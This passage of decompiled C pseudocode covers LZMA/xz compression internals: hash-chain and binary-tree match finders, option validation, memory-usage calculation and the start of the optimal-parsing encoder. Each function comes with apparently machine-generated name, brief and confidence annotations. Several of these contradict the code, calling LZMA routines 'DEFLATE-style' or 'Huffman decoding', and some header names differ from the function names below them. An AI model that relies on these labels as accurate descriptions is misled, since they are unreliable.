  piVar2 = (int *)(lVar10 + (ulong)(((*(int *)(&crc32_lookup_table + (ulong)pbVar16[3] * 4) << 5 ^ uVar9)
                                    & *(uint *)(param_1 + 0xb)) + 0x10400) * 4);
  iVar6 = *piVar2;
  *piVar1 = iVar15;
  *piVar3 = iVar15;
  *piVar2 = iVar15;
  uVar9 = *(uint *)((long)param_1 + 0x54);
  if ((uVar13 < uVar9) && (uVar18 = (ulong)uVar13, pbVar16[-uVar18] == *pbVar16)) {
    *param_2 = 2;
    param_2[1] = uVar13 - 1;
    if (((iVar4 == iVar5) || (uVar9 <= uVar8)) || (*pbVar16 != pbVar16[-(ulong)uVar8])) {
      uVar12 = 2;
      uVar17 = 1;
      puVar11 = param_2;
    }
    else {
      lVar10 = 1;
LAB_001178af:
      uVar18 = (ulong)uVar8;
      uVar17 = (ulong)((int)lVar10 + 1);
      (param_2 + lVar10 * 2)[1] = uVar8 - 1;
      uVar12 = 3;
      puVar11 = param_2 + lVar10 * 2;
    }
    if ((uint)uVar12 < uVar7) {
LAB_00117977:
      uVar14 = *(long *)(pbVar16 + (uVar12 - uVar18)) - *(long *)(pbVar16 + uVar12);
      if (uVar14 == 0) goto LAB_00117970;
      uVar8 = 0;
      for (; (uVar14 & 1) == 0; uVar14 = uVar14 >> 1 | 0x8000000000000000) {
        uVar8 = uVar8 + 1;
      }
      uVar13 = (uVar8 >> 3) + (int)uVar12;
      uVar8 = uVar13;
      if (uVar7 <= uVar13) {
        uVar8 = uVar7;
      }
      *puVar11 = uVar8;
      if (uVar13 < uVar7) {
        puVar11 = param_2 + uVar17 * 2;
        uVar13 = 3;
        if (2 < uVar8) {
          uVar13 = uVar8;
        }
        goto LAB_001178d8;
      }
      goto LAB_001179ba;
    }
LAB_001179b8:
    *puVar11 = uVar7;
LAB_001179ba:
    *(int *)(param_1[9] + (ulong)*(uint *)(param_1 + 10) * 4) = iVar6;
    update_model_state(param_1);
  }
  else {
    puVar11 = param_2;
    if ((iVar4 == iVar5) || (uVar9 <= uVar8)) {
      uVar13 = 3;
    }
    else {
      uVar13 = 3;
      if (pbVar16[-(ulong)uVar8] == *pbVar16) {
        lVar10 = 0;
        goto LAB_001178af;
      }
    }
LAB_001178d8:
    lVar10 = lz77_find_matches(uVar7,iVar15,pbVar16,iVar6,*(undefined4 *)((long)param_1 + 0x5c),
                               param_1[9],(int)param_1[10],uVar9,puVar11,uVar13);
    uVar17 = lVar10 - (long)param_2 >> 3;
    update_model_state(param_1);
  }
  return uVar17 & 0xffffffff;
LAB_00117970:
  uVar8 = (int)uVar12 + 8;
  uVar12 = (ulong)uVar8;
  if (uVar7 <= uVar8) goto LAB_001179b8;
  goto LAB_00117977;
}



/**
 * @name  lzma_mf_bt4_skip
 * @brief BT4 match finder skip: processes positions without finding matches, updates hash chains.
 * @confidence 75%
 * @classification utility
 * @address 0x00117a00
 */

/* Processes input data through what appears to be a compression algorithm using lookup tables and
   hash chains, likely part of a DEFLATE-style compressor. */

void deflate_compress_block(long *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  long lVar3;
  int iVar4;
  uint uVar5;
  byte *pbVar6;
  
  do {
    while (uVar5 = *(uint *)(param_1 + 3), *(int *)((long)param_1 + 0x24) - uVar5 < 4) {
      *(int *)(param_1 + 5) = (int)param_1[5] + 1;
      *(uint *)(param_1 + 3) = uVar5 + 1;
      param_2 = param_2 - 1;
      if (param_2 == 0) {
        return;
      }
    }
    iVar4 = uVar5 + *(int *)((long)param_1 + 0x14);
    pbVar6 = (byte *)((ulong)uVar5 + *param_1);
    lVar3 = param_1[8];
    uVar5 = (uint)pbVar6[2] << 8 ^ (uint)pbVar6[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar6 * 4);
    piVar1 = (int *)(lVar3 + (ulong)(((*(int *)(&crc32_lookup_table + (ulong)pbVar6[3] * 4) << 5 ^ uVar5)
                                     & *(uint *)(param_1 + 0xb)) + 0x10400) * 4);
    iVar2 = *piVar1;
    *(int *)(lVar3 + (ulong)(((uint)pbVar6[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar6 * 4)) &
                            0x3ff) * 4) = iVar4;
    *(int *)(lVar3 + 0x1000 + (ulong)(uVar5 & 0xffff) * 4) = iVar4;
    lVar3 = param_1[9];
    *piVar1 = iVar4;
    *(int *)(lVar3 + (ulong)*(uint *)(param_1 + 10) * 4) = iVar2;
    update_model_state();
    param_2 = param_2 - 1;
  } while (param_2 != 0);
  return;
}



/**
 * @name  lzma_mf_hc3_skip
 * @brief HC3 hash chain match finder with skip logic: updates hash tables and binary tree nodes.
 * @confidence 70%
 * @classification utility
 * @address 0x00117ab0
 */

/* Decodes Huffman-coded symbols using tree lookup and range calculation. Extracts symbol index,
   performs tree traversal, invokes helper functions for state updates. */

ulong lzma_huffman_decode(long *param_1,long param_2)

{
  int *piVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  long lVar5;
  long lVar6;
  int iVar7;
  uint uVar8;
  ulong uVar9;
  
  uVar2 = *(uint *)(param_1 + 3);
  uVar3 = *(uint *)(param_1 + 0xc);
  uVar8 = *(int *)((long)param_1 + 0x24) - uVar2;
  if ((uVar8 < uVar3) && ((uVar8 < 2 || (uVar3 = uVar8, (int)param_1[0xd] == 1)))) {
    *(int *)(param_1 + 5) = (int)param_1[5] + 1;
    *(uint *)(param_1 + 3) = uVar2 + 1;
    return 0;
  }
  lVar6 = *param_1;
  iVar7 = uVar2 + *(int *)((long)param_1 + 0x14);
  lVar5 = param_1[9];
  piVar1 = (int *)(param_1[8] + (ulong)*(ushort *)((ulong)uVar2 + lVar6) * 4);
  iVar4 = *piVar1;
  *piVar1 = iVar7;
  lVar6 = lz_find_matches_bt(uVar3,iVar7,(ushort *)((ulong)uVar2 + lVar6),iVar4,
                             *(undefined4 *)((long)param_1 + 0x5c),lVar5,(int)param_1[10],
                             *(undefined4 *)((long)param_1 + 0x54),param_2,1);
  uVar9 = lVar6 - param_2 >> 3;
  update_model_state(param_1);
  return uVar9 & 0xffffffff;
}



/**
 * @name  lzma_mf_hc4_skip
 * @brief HC3 hash chain match finder with combined find and skip operation for count positions.
 * @confidence 68%
 * @classification utility
 * @address 0x00117d80
 */

uint FUN_00117d80(long *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  long lVar5;
  uint uVar6;
  byte *pbVar7;
  int iVar8;
  uint uVar9;
  
  do {
    while( true ) {
      uVar3 = *(uint *)(param_1 + 3);
      uVar4 = *(uint *)(param_1 + 0xc);
      uVar9 = *(int *)((long)param_1 + 0x24) - uVar3;
      uVar6 = uVar4;
      if ((uVar4 <= uVar9) || ((2 < uVar9 && (uVar6 = uVar9, (int)param_1[0xd] != 1)))) break;
      *(int *)(param_1 + 5) = (int)param_1[5] + 1;
      *(uint *)(param_1 + 3) = uVar3 + 1;
      param_2 = param_2 - 1;
      if (param_2 == 0) {
        return uVar4;
      }
    }
    pbVar7 = (byte *)((ulong)uVar3 + *param_1);
    iVar8 = uVar3 + *(int *)((long)param_1 + 0x14);
    lVar5 = param_1[9];
    piVar1 = (int *)(param_1[8] +
                    (ulong)((((uint)pbVar7[2] << 8 ^
                             (uint)pbVar7[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar7 * 4)) &
                            *(uint *)(param_1 + 0xb)) + 0x400) * 4);
    iVar2 = *piVar1;
    *(int *)(param_1[8] +
            (ulong)(((uint)pbVar7[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar7 * 4)) & 0x3ff) * 4)
         = iVar8;
    *piVar1 = iVar8;
    uVar3 = *(uint *)(param_1 + 10);
    bt_match_find_insert(uVar6,iVar8,pbVar7,iVar2,*(undefined4 *)((long)param_1 + 0x5c),lVar5);
    update_model_state(param_1);
    param_2 = param_2 - 1;
  } while (param_2 != 0);
  return uVar3;
}



/**
 * @name  lzma_mf_bt4_find
 * @brief Optimal binary tree match finder for LZMA. Similar to fast variant but includes mode check for limited bytes and calls bt_match_find_insert for hash chain updates when matches reach nice length.
 * @confidence 80%
 * @classification utility
 * @address 0x00117e50
 */

/* Optimal match finder for LZMA compression. Very similar to the fast variant but includes an
   additional check on param_1[0xd] (likely 'mode' field) to handle cases where available bytes are
   limited. Also calls suffix_array_build_partial for hash chain updates when matches extend to the
   nice length, rather than the simpler skip used in fast mode. */

ulong lzma_find_matches_optimal(long *param_1,uint *param_2)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  long lVar10;
  uint *puVar11;
  ulong uVar12;
  int iVar13;
  byte *pbVar14;
  uint uVar15;
  ulong uVar16;
  ulong uVar17;
  
  uVar9 = *(uint *)(param_1 + 3);
  uVar8 = *(int *)((long)param_1 + 0x24) - uVar9;
  uVar7 = *(uint *)(param_1 + 0xc);
  if ((uVar8 < *(uint *)(param_1 + 0xc)) && ((uVar8 < 4 || (uVar7 = uVar8, (int)param_1[0xd] == 1)))
     ) {
    *(int *)(param_1 + 5) = (int)param_1[5] + 1;
    *(uint *)(param_1 + 3) = uVar9 + 1;
    return 0;
  }
  pbVar14 = (byte *)((ulong)uVar9 + *param_1);
  iVar13 = uVar9 + *(int *)((long)param_1 + 0x14);
  lVar10 = param_1[8];
  uVar9 = (uint)pbVar14[2] << 8 ^ (uint)pbVar14[1] ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar14 * 4);
  piVar1 = (int *)(lVar10 + (ulong)(((uint)pbVar14[1] ^
                                    *(uint *)(&crc32_lookup_table + (ulong)*pbVar14 * 4)) & 0x3ff) * 4);
  piVar3 = (int *)(lVar10 + 0x1000 + (ulong)(uVar9 & 0xffff) * 4);
  iVar4 = *piVar1;
  iVar5 = *piVar3;
  uVar8 = iVar13 - iVar4;
  uVar15 = iVar13 - iVar5;
  piVar2 = (int *)(lVar10 + (ulong)(((*(int *)(&crc32_lookup_table + (ulong)pbVar14[3] * 4) << 5 ^ uVar9)
                                    & *(uint *)(param_1 + 0xb)) + 0x10400) * 4);
  iVar6 = *piVar2;
  *piVar1 = iVar13;
  *piVar3 = iVar13;
  *piVar2 = iVar13;
  uVar9 = *(uint *)((long)param_1 + 0x54);
  if ((uVar8 < uVar9) && (uVar17 = (ulong)uVar8, pbVar14[-uVar17] == *pbVar14)) {
    *param_2 = 2;
    param_2[1] = uVar8 - 1;
    if (((iVar4 == iVar5) || (uVar9 <= uVar15)) || (*pbVar14 != pbVar14[-(ulong)uVar15])) {
      uVar8 = 2;
      uVar16 = 1;
      puVar11 = param_2;
    }
    else {
      lVar10 = 1;
LAB_00117f49:
      uVar17 = (ulong)uVar15;
      uVar16 = (ulong)((int)lVar10 + 1);
      uVar8 = 3;
      (param_2 + lVar10 * 2)[1] = uVar15 - 1;
      puVar11 = param_2 + lVar10 * 2;
    }
    if (uVar8 < uVar7) {
LAB_00118007:
      uVar12 = *(long *)(pbVar14 + uVar8) - *(long *)(pbVar14 + (uVar8 - uVar17));
      if (uVar12 == 0) goto LAB_00118000;
      uVar15 = 0;
      for (; (uVar12 & 1) == 0; uVar12 = uVar12 >> 1 | 0x8000000000000000) {
        uVar15 = uVar15 + 1;
      }
      uVar8 = (uVar15 >> 3) + uVar8;
      uVar15 = uVar8;
      if (uVar7 <= uVar8) {
        uVar15 = uVar7;
      }
      *puVar11 = uVar15;
      if (uVar8 < uVar7) {
        puVar11 = param_2 + uVar16 * 2;
        uVar8 = 3;
        if (2 < uVar15) {
          uVar8 = uVar15;
        }
        goto LAB_00117f70;
      }
      goto LAB_00118053;
    }
LAB_00118050:
    *puVar11 = uVar7;
LAB_00118053:
    bt_match_find_insert
              (uVar7,iVar13,pbVar14,iVar6,*(undefined4 *)((long)param_1 + 0x5c),param_1[9],
               (int)param_1[10],uVar9);
    update_model_state(param_1);
  }
  else {
    puVar11 = param_2;
    if ((iVar4 == iVar5) || (uVar9 <= uVar15)) {
      uVar8 = 3;
    }
    else {
      uVar8 = 3;
      if (pbVar14[-(ulong)uVar15] == *pbVar14) {
        lVar10 = 0;
        goto LAB_00117f49;
      }
    }
LAB_00117f70:
    lVar10 = lz_find_matches_bt(uVar7,iVar13,pbVar14,iVar6,*(undefined4 *)((long)param_1 + 0x5c),
                                param_1[9],(int)param_1[10],uVar9,puVar11,uVar8);
    uVar16 = lVar10 - (long)param_2 >> 3;
    update_model_state(param_1);
  }
  return uVar16 & 0xffffffff;
LAB_00118000:
  uVar8 = uVar8 + 8;
  if (uVar7 <= uVar8) goto LAB_00118050;
  goto LAB_00118007;
}



/**
 * @name  lzma_mf_bt4_find_and_skip
 * @brief BT4 (Binary Tree with 4-byte hash) match finder: updates 4-level hash chains, searches for matches using binary tree.
 * @confidence 78%
 * @classification utility
 * @address 0x001180a0
 */

/* Performs one iteration of LZ77 compression by maintaining hash table, finding matches, and
   encoding symbols */

uint lzma_lz_compress_step(long *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  long lVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  byte *pbVar9;
  
  do {
    while( true ) {
      uVar6 = *(uint *)(param_1 + 3);
      uVar3 = *(uint *)(param_1 + 0xc);
      uVar8 = *(int *)((long)param_1 + 0x24) - uVar6;
      uVar5 = uVar3;
      if ((uVar3 <= uVar8) || ((3 < uVar8 && (uVar5 = uVar8, (int)param_1[0xd] != 1)))) break;
      *(int *)(param_1 + 5) = (int)param_1[5] + 1;
      *(uint *)(param_1 + 3) = uVar6 + 1;
      param_2 = param_2 - 1;
      if (param_2 == 0) {
        return uVar3;
      }
    }
    pbVar9 = (byte *)((ulong)uVar6 + *param_1);
    lVar4 = param_1[8];
    iVar7 = uVar6 + *(int *)((long)param_1 + 0x14);
    uVar6 = (uint)pbVar9[2] << 8 ^ *(uint *)(&crc32_lookup_table + (ulong)*pbVar9 * 4) ^ (uint)pbVar9[1];
    piVar1 = (int *)(lVar4 + (ulong)(((*(int *)(&crc32_lookup_table + (ulong)pbVar9[3] * 4) << 5 ^ uVar6)
                                     & *(uint *)(param_1 + 0xb)) + 0x10400) * 4);
    iVar2 = *piVar1;
    *(int *)(lVar4 + (ulong)((*(uint *)(&crc32_lookup_table + (ulong)*pbVar9 * 4) ^ (uint)pbVar9[1]) &
                            0x3ff) * 4) = iVar7;
    *(int *)(lVar4 + 0x1000 + (ulong)(uVar6 & 0xffff) * 4) = iVar7;
    *piVar1 = iVar7;
    uVar6 = *(uint *)(param_1 + 10);
    bt_match_find_insert(uVar5,iVar7,pbVar9,iVar2,*(undefined4 *)((long)param_1 + 0x5c),param_1[9]);
    update_model_state(param_1);
    param_2 = param_2 - 1;
  } while (param_2 != 0);
  return uVar6;
}



/**
 * @name  lzma_lzma2_encoder_set_out_limit
 * @brief Sets LZMA2 encoder output limit (must be >5), stores limit and memusage pointer
 * @confidence 80%
 * @classification utility
 * @address 0x00118ab0
 */

/* Sets encoder output size limit if > 5 */

undefined8 lzma_lzma2_encoder_set_out_limit(long param_1,undefined8 param_2,ulong param_3)

{
  undefined8 uVar1;
  
  uVar1 = 10;
  if (5 < param_3) {
    *(ulong *)(param_1 + 0x2b8) = param_3;
    uVar1 = 0;
    *(undefined8 *)(param_1 + 0x2c0) = param_2;
    *(undefined1 *)(param_1 + 0xb77) = 0;
  }
  return uVar1;
}



/**
 * @name  lzma_lzma_lclppb_validate
 * @brief Validates LZMA options: lc<5, lp<5, lc+lp<5, pb<5, mode 1-2, nice_len 2-273
 * @confidence 90%
 * @classification utility
 * @address 0x00118ae0
 */

/* Validates lc, lp, pb, mode, and nice_len parameters */

bool lzma_lzma_lclppb_validate(long param_1)

{
  bool bVar1;
  
  bVar1 = false;
  if ((((*(uint *)(param_1 + 0x14) < 5) && (*(uint *)(param_1 + 0x18) < 5)) &&
      (*(uint *)(param_1 + 0x14) + *(uint *)(param_1 + 0x18) < 5)) &&
     ((bVar1 = false, *(uint *)(param_1 + 0x1c) < 5 && (*(int *)(param_1 + 0x24) - 2U < 0x110)))) {
    bVar1 = *(int *)(param_1 + 0x20) - 1U < 2;
  }
  return bVar1;
}



/**
 * @name  lzma_lzma2_encoder_memusage
 * @brief Calculates LZMA2 encoder memory usage from options. Validates lclppb, builds internal params, adds 0x3ced0 overhead.
 * @confidence 75%
 * @classification utility
 * @address 0x0011a770
 */

long FUN_0011a770(uint *param_1)

{
  uint uVar1;
  char cVar2;
  long lVar3;
  long in_FS_OFFSET;
  undefined8 local_58;
  ulong local_50;
  undefined8 local_48;
  undefined8 local_40;
  ulong local_38;
  uint local_30;
  uint local_2c;
  undefined8 local_28;
  uint local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  cVar2 = lzma_lzma_lclppb_validate();
  if (cVar2 != '\0') {
    local_50 = (ulong)*param_1;
    local_30 = param_1[10];
    local_58 = 0x1000;
    local_48 = 0x1001;
    local_40 = 0x111;
    uVar1 = param_1[9];
    if (param_1[9] < (local_30 & 0xf)) {
      uVar1 = local_30 & 0xf;
    }
    local_38 = (ulong)uVar1;
    local_2c = param_1[0xb];
    local_28 = *(undefined8 *)(param_1 + 2);
    local_20 = param_1[4];
    lVar3 = lzma_lzma_preset_encoder_get_size(&local_58);
    if (lVar3 != -1) {
      lVar3 = lVar3 + 0x3ced0;
      goto LAB_0011a7fa;
    }
  }
  lVar3 = -1;
LAB_0011a7fa:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return lVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzma_find_match_or_literal
 * @brief Core LZMA encoder function finding optimal match or literal. Checks rep0-rep3 distances first, evaluates normal matches from match finder, applies heuristics. Returns length=1/dist=-1 for literal.
 * @confidence 82%
 * @classification utility
 * @address 0x0011a8d0
 */

/* Core LZMA encoder function that finds the optimal match (length/distance pair) or decides to
   output a literal. Checks recent match distances (rep0-rep3) first, then evaluates normal matches
   from the match finder, applying heuristics to determine if a match is worth encoding vs
   outputting a literal. Returns match length in *match_len_out (1=literal) and distance in
   *match_dist_out (-1 for literal). */

void find_match_or_literal(long param_1,long *param_2,int *param_3,uint *param_4)

{
  bool bVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  ulong uVar5;
  uint uVar6;
  short *psVar7;
  uint *puVar8;
  uint uVar9;
  uint uVar10;
  long lVar11;
  uint uVar12;
  void *__s1;
  size_t __n;
  uint uVar13;
  long in_FS_OFFSET;
  uint local_44;
  long local_40;
  
  uVar10 = *(uint *)(param_2 + 0xc);
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (*(int *)((long)param_2 + 0x1c) == 0) {
    uVar3 = lzma_range_match_distance(param_2,&local_44,param_1 + 0x2dc);
  }
  else {
    local_44 = *(uint *)(param_1 + 0xb6c);
    uVar3 = *(uint *)(param_1 + 0xb70);
  }
  __s1 = (void *)((ulong)*(uint *)(param_2 + 3) + *param_2);
  uVar12 = (*(int *)((long)param_2 + 0x24) + 1) - *(uint *)(param_2 + 3);
  if (uVar12 < 0x111) {
    if (1 < uVar12) goto LAB_0011a950;
    goto LAB_0011ab78;
  }
  uVar12 = 0x111;
LAB_0011a950:
  iVar4 = 0;
  lVar11 = 0;
  uVar13 = 0;
  do {
    psVar7 = (short *)((long)__s1 + (~(ulong)*(uint *)(param_1 + 0x2cc + lVar11 * 4) - 1));
    if (*psVar7 == *(short *)((long)__s1 - 1)) {
      if (uVar12 != 2) {
        uVar9 = 2;
LAB_0011aa6c:
        uVar5 = *(long *)((long)__s1 + ((ulong)uVar9 - 1)) - *(long *)((long)psVar7 + (ulong)uVar9);
        if (uVar5 == 0) goto LAB_0011aa60;
        uVar6 = 0;
        for (; (uVar5 & 1) == 0; uVar5 = uVar5 >> 1 | 0x8000000000000000) {
          uVar6 = uVar6 + 1;
        }
        uVar6 = uVar9 + (uVar6 >> 3);
        if (uVar12 < uVar6) {
          uVar6 = uVar12;
        }
        goto LAB_0011aa92;
      }
      uVar6 = 2;
LAB_0011aa92:
      if (uVar10 <= uVar6) {
        *param_4 = uVar6;
        *param_3 = (int)lVar11;
        (*(code *)param_2[7])(param_2,uVar6 - 1);
        *(int *)((long)param_2 + 0x1c) = *(int *)((long)param_2 + 0x1c) + (uVar6 - 1);
        goto LAB_0011ab8b;
      }
      if (uVar13 < uVar6) {
        uVar13 = uVar6;
        iVar4 = (int)lVar11;
      }
    }
    lVar11 = lVar11 + 1;
  } while (lVar11 != 4);
  if (uVar10 <= uVar3) {
    *param_4 = uVar3;
    iVar4 = uVar3 - 1;
    *param_3 = *(int *)(param_1 + 0x2e0 + (ulong)(local_44 - 1) * 8) + 4;
joined_r0x0011ac01:
    if (iVar4 != 0) {
      (*(code *)param_2[7])(param_2,iVar4);
      *(int *)((long)param_2 + 0x1c) = *(int *)((long)param_2 + 0x1c) + iVar4;
    }
    goto LAB_0011ab8b;
  }
  if (uVar3 < 2) {
LAB_0011aa12:
    if (1 < uVar13) {
LAB_0011aa1c:
      *param_4 = uVar13;
      *param_3 = iVar4;
      (*(code *)param_2[7])(param_2,uVar13 - 1);
      *(int *)((long)param_2 + 0x1c) = *(int *)((long)param_2 + 0x1c) + (uVar13 - 1);
      goto LAB_0011ab8b;
    }
  }
  else {
    bVar1 = false;
    uVar10 = *(uint *)(param_1 + 0x2e0 + (ulong)(local_44 - 1) * 8);
    uVar6 = local_44;
    uVar9 = uVar10;
    uVar2 = uVar3;
    if (1 < local_44) {
      do {
        lVar11 = param_1 + (ulong)(uVar6 - 2) * 8;
        uVar3 = *(uint *)(lVar11 + 0x2dc);
        if ((uVar3 + 1 != uVar2) || (uVar10 = *(uint *)(lVar11 + 0x2e0), uVar9 >> 7 <= uVar10)) {
          uVar3 = uVar2;
          uVar10 = uVar9;
          if (bVar1) {
            local_44 = uVar6;
          }
          goto LAB_0011a9ff;
        }
        uVar6 = uVar6 - 1;
        bVar1 = true;
        uVar9 = uVar10;
        uVar2 = uVar3;
      } while (uVar6 != 1);
      local_44 = 1;
    }
LAB_0011a9ff:
    if ((uVar3 == 2) && (0x7f < uVar10)) goto LAB_0011aa12;
    if ((1 < uVar13) &&
       (((uVar3 <= uVar13 + 1 || ((uVar3 <= uVar13 + 2 && (0x200 < uVar10)))) ||
        ((uVar3 <= uVar13 + 3 && (0x8000 < uVar10)))))) goto LAB_0011aa1c;
    if ((1 < uVar3) && (2 < uVar12)) {
      uVar12 = lzma_range_match_distance(param_2,param_1 + 0xb6c,(uint *)(param_1 + 0x2dc));
      *(uint *)(param_1 + 0xb70) = uVar12;
      if (uVar12 < 2) {
LAB_0011ac40:
        __n = (size_t)(uVar3 - 1);
        if (uVar3 - 1 < 2) {
          __n = 2;
        }
        puVar8 = (uint *)(param_1 + 0x2cc);
        do {
          iVar4 = memcmp(__s1,(void *)(~(ulong)*puVar8 + (long)__s1),__n);
          if (iVar4 == 0) goto LAB_0011ab78;
          puVar8 = puVar8 + 1;
        } while ((uint *)(param_1 + 0x2dc) != puVar8);
        *param_4 = uVar3;
        *param_3 = uVar10 + 4;
        iVar4 = uVar3 - 2;
        goto joined_r0x0011ac01;
      }
      uVar13 = *(uint *)(param_1 + 0x2e0 + (ulong)(*(int *)(param_1 + 0xb6c) - 1) * 8);
      if ((uVar12 < uVar3) || (uVar10 <= uVar13)) {
        if (uVar12 == uVar3 + 1) {
          if (uVar10 < uVar13 >> 7) goto LAB_0011ac21;
        }
        else if (uVar12 <= uVar3 + 1) {
LAB_0011ac21:
          if (((uVar12 + 1 < uVar3) || (uVar3 == 2)) || (uVar10 >> 7 <= uVar13)) goto LAB_0011ac40;
        }
      }
    }
  }
LAB_0011ab78:
  *param_4 = 1;
  *param_3 = -1;
LAB_0011ab8b:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
LAB_0011aa60:
  uVar9 = uVar9 + 8;
  uVar6 = uVar12;
  if (uVar12 <= uVar9) goto LAB_0011aa92;
  goto LAB_0011aa6c;
}



/**
 * @name  lzma_lzma_optimal_match
 * @brief LZMA optimal parsing with dynamic programming. Evaluates literals, short reps, rep matches, normal matches computing bit costs via probability price tables. Traces back optimal path for best distance/length.
 * @confidence 85%
 * @classification utility
 * @address 0x0011add0
 */

/* LZMA optimal parsing with dynamic programming. Evaluates multiple encoding options (literals,
   short reps, rep matches, normal matches) computing bit costs using probability price tables.
   Traces back optimal path to determine best distance/length pair. Uses distance slot lookup tables
   and length price calculations. */

void lzma_optimal_match(long param_1,long *param_2,int *param_3,uint *param_4,uint param_5)

{
  int *piVar1;
  uint uVar2;
  long lVar3;
  long lVar4;
  short *psVar5;
  char cVar6;
  char cVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  short sVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  short *psVar17;
  long lVar18;
  long lVar19;
  undefined4 *puVar20;
  undefined4 uVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  ulong uVar25;
  long lVar26;
  ulong uVar27;
  ulong uVar28;
  uint uVar29;
  uint uVar30;
  uint uVar31;
  uint uVar32;
  int iVar33;
  undefined4 uVar34;
  uint uVar35;
  ulong uVar36;
  ulong uVar37;
  ushort uVar38;
  uint uVar39;
  undefined4 uVar40;
  uint uVar41;
  int iVar42;
  long lVar43;
  undefined4 *puVar44;
  uint uVar45;
  ulong uVar46;
  int iVar47;
  undefined4 *puVar48;
  int iVar49;
  uint uVar50;
  long in_FS_OFFSET;
  bool bVar51;
  uint local_138;
  uint local_134;
  uint local_128;
  uint local_114;
  uint local_110;
  uint local_10c;
  uint local_fc;
  uint local_5c;
  undefined8 local_58;
  undefined8 uStack_50;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  uVar29 = *(uint *)(param_1 + 0x10ec8);
  if (*(uint *)(param_1 + 0x10ec4) != uVar29) {
    lVar43 = param_1 + (ulong)uVar29 * 0x2c;
    iVar14 = *(int *)(lVar43 + 0x10ee0);
    iVar49 = *(int *)(lVar43 + 0x10ee4);
    *(int *)(param_1 + 0x10ec8) = iVar14;
    *param_4 = iVar14 - uVar29;
    *param_3 = iVar49;
    goto LAB_0011ae52;
  }
  uVar29 = *(uint *)(param_2 + 0xc);
  if (*(int *)((long)param_2 + 0x1c) == 0) {
    if (0x7f < *(uint *)(param_1 + 0x10e7c)) {
      lVar43 = param_1 + 0x6ee4;
      puVar20 = (undefined4 *)(param_1 + 0x10278);
      puVar48 = (undefined4 *)(param_1 + 0x10678);
      do {
        uVar46 = 0;
        if (*(int *)(param_1 + 0x10e78) != 0) {
          do {
            iVar14 = 0;
            uVar41 = (int)uVar46 + 0x40;
            do {
              uVar39 = uVar41 >> 1;
              iVar14 = iVar14 + (uint)(byte)(&prob_price_table)
                                            [((uint)*(ushort *)(lVar43 + (ulong)uVar39 * 2) ^
                                             -(uVar41 & 1) & 0x7ff) >> 4];
              uVar41 = uVar39;
            } while (uVar39 != 1);
            puVar20[uVar46] = iVar14;
            uVar41 = (int)uVar46 + 1;
            uVar46 = (ulong)uVar41;
          } while (uVar41 < *(uint *)(param_1 + 0x10e78));
          if (0xe < *(uint *)(param_1 + 0x10e78)) {
            uVar41 = 0xe;
            do {
              uVar39 = uVar41 + 1;
              puVar20[uVar41] = puVar20[uVar41] + ((uVar41 >> 1) - 5) * 0x10;
              uVar41 = uVar39;
            } while (uVar39 < *(uint *)(param_1 + 0x10e78));
          }
        }
        puVar44 = puVar20 + 0x40;
        lVar43 = lVar43 + 0x80;
        *puVar48 = *puVar20;
        puVar48[1] = puVar20[1];
        puVar48[2] = puVar20[2];
        puVar48[3] = puVar20[3];
        puVar20 = puVar44;
        puVar48 = puVar48 + 0x80;
      } while ((undefined4 *)(param_1 + 0x10678) != puVar44);
      lVar43 = 4;
      do {
        bVar8 = (&dist_slot_log2_table)[lVar43];
        uVar46 = (ulong)bVar8;
        iVar49 = 0;
        uVar41 = 1;
        iVar14 = (bVar8 >> 1) - 1;
        uVar15 = (uint)(bVar8 & 1 | 2) << ((byte)iVar14 & 0x1f);
        uVar39 = (int)lVar43 - uVar15;
        do {
          uVar28 = (ulong)uVar41;
          uVar41 = (uVar39 & 1) + uVar41 * 2;
          iVar49 = iVar49 + (uint)(byte)(&prob_price_table)
                                        [((uint)*(ushort *)
                                                 (param_1 + uVar28 * 2 +
                                                 (uVar15 - uVar46) * 2 + 0x70e2) ^
                                         -(uVar39 & 1) & 0x7ff) >> 4];
          iVar14 = iVar14 - 1;
          uVar39 = uVar39 >> 1;
        } while (iVar14 != 0);
        lVar26 = param_1 + uVar46 * 4;
        do {
          piVar1 = (int *)(lVar26 + 0x10278);
          lVar18 = lVar26 * 2;
          lVar26 = lVar26 + 0x100;
          *(int *)((uVar46 * -8 - param_1) + lVar18 + 0x10678 + lVar43 * 4) = *piVar1 + iVar49;
        } while (uVar46 * 4 + param_1 + 0x400 != lVar26);
        lVar43 = lVar43 + 1;
      } while (lVar43 != 0x80);
      *(undefined4 *)(param_1 + 0x10e7c) = 0;
    }
    if (0xf < *(uint *)(param_1 + 0x10ec0)) {
      uVar46 = 0;
      do {
        iVar49 = 0;
        iVar14 = 4;
        uVar36 = 1;
        uVar28 = uVar46 & 0xffffffff;
        do {
          uVar41 = (uint)uVar28 & 1;
          lVar43 = uVar36 * 2;
          uVar36 = (ulong)(uVar41 + (int)uVar36 * 2);
          iVar49 = iVar49 + (uint)(byte)(&prob_price_table)
                                        [((uint)*(ushort *)(param_1 + 0x71c8 + lVar43) ^
                                         -uVar41 & 0x7ff) >> 4];
          iVar14 = iVar14 - 1;
